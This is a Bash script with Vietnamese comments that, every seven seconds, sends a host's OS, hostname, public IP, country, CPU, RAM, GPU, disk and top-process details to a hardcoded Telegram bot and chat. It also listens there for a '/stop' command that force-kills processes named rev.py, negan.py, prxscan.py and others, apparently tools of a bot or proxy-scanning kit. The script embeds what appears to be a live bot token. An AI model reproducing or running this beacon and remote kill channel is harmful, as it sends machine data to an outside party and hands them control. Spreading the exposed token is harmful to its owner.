#!/bin/bash

# Thông tin Telegram
TELEGRAM_TOKEN="7828296793:AAEw4A7NI8tVrdrcR0TQZXyOpNSPbJmbGUU"
CHAT_ID="7371969470"
POLLING_INTERVAL=7

# Biến flag để kiểm soát việc dừng polling
STOP_POLLING=false

# Hàm gửi tin nhắn qua Telegram
send_telegram_message() {
    local message=$1
    local response=$(curl -s -w "%{http_code}" -o /dev/null -X POST "https://api.telegram.org/bot$TELEGRAM_TOKEN/sendMessage" \
        -d chat_id="$CHAT_ID" \
        -d text="$message" \
        -d parse_mode="HTML")

    if [[ "$response" -ne 200 ]]; then
        echo "Lỗi khi gửi tin nhắn: Mã phản hồi $response"
    fi
}

# Hàm bỏ qua toàn bộ lệnh trước đó
ignore_previous_commands() {
    # Lấy update_id cuối cùng từ Telegram API
    local last_update_id=$(curl -s "https://api.telegram.org/bot$TELEGRAM_TOKEN/getUpdates" | jq -r '.result[-1].update_id')

    # Nếu có update_id, đặt offset lớn hơn last_update_id để bỏ qua tất cả lệnh trước đó
    if [[ -n "$last_update_id" && "$last_update_id" != "null" ]]; then
        curl -s "https://api.telegram.org/bot$TELEGRAM_TOKEN/getUpdates?offset=$((last_update_id + 1))&timeout=0" > /dev/null
    fi
}

# Hàm kill mạnh mẽ các tiến trình
strong_kill() {
    local processes=("rev.py" "negan.py" "prxscan.py" "start.sh" "monitor.sh" "setup.sh")
    for process in "${processes[@]}"; do
        # Kill tiến trình chính
        pkill -9 -f "$process"

        # Kill các tiến trình con (nếu có)
        for pid in $(pgrep -f "$process"); do
            # Kill tất cả tiến trình con của tiến trình hiện tại
            pkill -9 -P "$pid"
        done
    done

    # Sử dụng killall để đảm bảo kill tất cả các tiến trình liên quan
    killall -9 -q "${processes[@]}"

    # Kiểm tra xem các tiến trình đã bị kill chưa
    for process in "${processes[@]}"; do
        if pgrep -f "$process" > /dev/null; then
            send_telegram_message "Không thể kill tiến trình $process."
        else
            send_telegram_message "Đã kill tiến trình $process thành công."
        fi
    done
}

# Hàm kiểm tra lệnh từ Telegram
check_telegram_command() {
    local updates=$(curl -s "https://api.telegram.org/bot$TELEGRAM_TOKEN/getUpdates")
    local update_id=$(echo "$updates" | jq -r '.result[-1].update_id')

    if [[ -n "$update_id" && "$update_id" != "null" ]]; then
        # Đặt offset lớn hơn update_id để bỏ qua lệnh này trong lần sau
        curl -s "https://api.telegram.org/bot$TELEGRAM_TOKEN/getUpdates?offset=$((update_id + 1))&timeout=0" > /dev/null

        # Kiểm tra nếu có lệnh /stop
        if echo "$updates" | grep -q "/stop"; then
            send_telegram_message "Đang ngừng giám sát và dừng polling..."
            STOP_POLLING=true
            strong_kill
            exit 0
        fi
    fi
}

# Hàm lấy thông tin hệ thống
get_system_info() {
    local os_name=$(grep PRETTY_NAME /etc/os-release | cut -d'"' -f2)
    local hostname=$(hostname)
    local ip_address=$(curl -s ifconfig.me)
    local country=$(curl -s "http://ipinfo.io/$ip_address/country")
    [[ "$country" == *"Rate limit exceeded"* ]] && country="Block Limit"

    # Thông tin RAM
    read -r total_ram_kb used_ram_kb <<< $(free -k | awk '/Mem:/ {print $2, $3}')
    local total_ram_gb=$(echo "scale=2; $total_ram_kb / 1048576" | bc)
    local used_ram_gb=$(echo "scale=2; $used_ram_kb / 1048576" | bc)
    local ram_usage_percent=$(echo "scale=2; ($used_ram_kb / $total_ram_kb) * 100" | bc)
    local ram_free_percent=$(echo "scale=2; 100 - $ram_usage_percent" | bc)

    # Định dạng lại giá trị RAM
    local formatted_used_ram_gb=$(printf "%0.2f" $used_ram_gb)

    # Thông tin CPU
    local cpu_usage=$(top -bn1 | grep "Cpu(s)" | sed 's/.*, *\([0-9.]*\)%* id.*/\1/' | awk '{print 100 - $1}')
    local cpu_free=$(echo "scale=2; 100 - $cpu_usage" | bc)
    local cpu_cores=$(lscpu | awk '/^CPU\(s\):/ {print $2}' 2>/dev/null || echo "Không xác định")
    local cpu_cores_used=$(echo "scale=2; $cpu_usage / 100 * $cpu_cores" | bc)
    local cpu_cores_free=$(echo "scale=2; $cpu_cores - $cpu_cores_used" | bc)
    local cpu_cores_used_percent=$(echo "scale=2; ($cpu_cores_used / $cpu_cores) * 100" | bc)
    local cpu_cores_free_percent=$(echo "scale=2; 100 - $cpu_cores_used_percent" | bc)

    # Định dạng lại giá trị CPU cores
    local formatted_cpu_cores_used=$(printf "%0.2f" $cpu_cores_used)
    local formatted_cpu_cores_free=$(printf "%0.2f" $cpu_cores_free)

    # Thông tin đĩa cứng
    local disk_usage=$(df -h / | awk 'NR==2 {print $3 "/" $2 " (" $5 " used)"}')

    # Thông tin GPU và thiết bị
    local gpu_info="Không xác định"
    if command -v lspci &> /dev/null; then
        gpu_info=$(lspci | grep -i 'vga\|3d\|2d\|scsi' | sed 's/^[^ ]* //;s/ (.*$//' | head -n 1)
        [[ -z "$gpu_info" ]] && gpu_info="Không có GPU/SCSI"
    fi

    # Thông tin tiến trình
    local top_process=$(ps -eo pid,comm,%mem,%cpu --sort=-%cpu | awk 'NR==2')
    local top_pid=$(echo "$top_process" | awk '{print $1}')
    local top_cmd=$(echo "$top_process" | awk '{print $2}')
    local top_mem=$(echo "$top_process" | awk '{print $3}')
    local top_cpu=$(echo "$top_process" | awk '{print $4}')

    # Thông tin uptime
    local uptime=$(uptime -p | sed 's/up //')

    # Tạo thông điệp
    local message="🖥 Hệ điều hành BOT FREE NEGAN_REV: $os_name
📡 Hostname: $hostname
🌐 IP: $ip_address (Quốc gia: $country)
🏗 RAM: Tổng ${total_ram_gb}GB | Đã dùng ${formatted_used_ram_gb}GB (${ram_usage_percent}%) | Trống ${ram_free_percent}% |
🧠 CPU: Sử dụng ${cpu_usage}% | Trống ${cpu_free}% |
💻 Tổng số cores: $cpu_cores | Cores sử dụng: ${formatted_cpu_cores_used} (${cpu_cores_used_percent}%) | Cores trống: ${formatted_cpu_cores_free} (${cpu_cores_free_percent}%)
🔍 Tiến trình tiêu tốn tài nguyên nhất: PID $top_pid | Lệnh: $top_cmd | RAM: ${top_mem}% | CPU: ${top_cpu}% |
💾 Đĩa cứng: $disk_usage
🎮 GPU: $gpu_info
⏳ Uptime: $uptime"

    echo "$message"
}

# Bỏ qua toàn bộ lệnh trước đó khi khởi động
ignore_previous_commands

# Vòng lặp chính
while true; do
    if $STOP_POLLING; then
        send_telegram_message "Đã dừng polling và thoát script."
        exit 0
    fi

    check_telegram_command
    system_info=$(get_system_info)
    send_telegram_message "$system_info"
    echo "$system_info"
    echo "----------------------------------------"
    sleep $POLLING_INTERVAL
done
